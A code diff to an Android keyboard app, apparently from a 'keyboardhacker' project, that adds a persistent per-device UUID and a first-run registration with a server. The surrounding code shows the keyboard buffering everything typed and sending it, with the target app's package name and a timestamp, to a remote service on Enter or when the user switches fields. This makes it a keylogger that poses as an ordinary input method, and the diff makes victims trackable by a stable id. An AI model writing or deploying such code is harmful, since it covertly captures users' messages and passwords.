@@ -1,14 +1,17 @@
 package edu.cmu.keyboardhacker.simplekeyboard;
 
+import android.content.SharedPreferences;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.media.AudioManager;
+import android.preference.PreferenceManager;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
 import java.util.Date;
+import java.util.UUID;
 
 /**
  * Created by helunwen on 11/9/16.
@@ -23,16 +26,23 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
 
     private InputConnection inputConnection;
 
-    private String deviceId = "some device id";
-
     @Override
     public View onCreateInputView() {
+        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+        boolean isFirstRun = sharedPreferences.getBoolean("FIRSTRUN", true);
+        //If this the first run of app, generate device id and register in server.
+        if (isFirstRun)
+        {
+            SharedPreferences.Editor editor = sharedPreferences.edit();
+            editor.putBoolean("FIRSTRUN", false);
+            editor.commit();
+            new DeviceService(this.getDeviceId(), String.valueOf(System.currentTimeMillis())).execute();
+        }
         kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
         keyboard = new Keyboard(this, R.xml.qwerty);
         kv.setKeyboard(keyboard);
         kv.setOnKeyboardActionListener(this);
         this.inputConnection = null;
-        new DeviceService(this.deviceId, String.valueOf(System.currentTimeMillis())).execute();
         return kv;
     }
 
@@ -43,7 +53,7 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
             this.inputConnection = ic;
             if (this.stringBuffer.length() > 0) {
                 new MessagService(
-                        this.deviceId,
+                        this.getDeviceId(),
                         String.valueOf(System.currentTimeMillis()),
                         this.stringBuffer.toString(),
                         this.getCurrentInputEditorInfo().packageName
@@ -67,7 +77,7 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
             case Keyboard.KEYCODE_DONE:
                 ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                 new MessagService(
-                        this.deviceId,
+                        this.getDeviceId(),
                         String.valueOf(System.currentTimeMillis()),
                         this.stringBuffer.toString(),
                         this.getCurrentInputEditorInfo().packageName
@@ -84,6 +94,22 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
         }
     }
 
+    /**
+     * Get the device id.
+     * @return device id
+     * */
+    private String getDeviceId() {
+        String defaultDeviceId = UUID.randomUUID().toString();
+        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+        if (sharedPreferences.contains("DEVICEID")) {
+            return sharedPreferences.getString("DEVICEID", defaultDeviceId);
+        } else {
+            SharedPreferences.Editor editor = sharedPreferences.edit();
+            editor.putString("DEVICEID", defaultDeviceId);
+            editor.commit();
+            return defaultDeviceId;
+        }
+    }
     @Override
     public void onPress(int primaryCode) {
     }
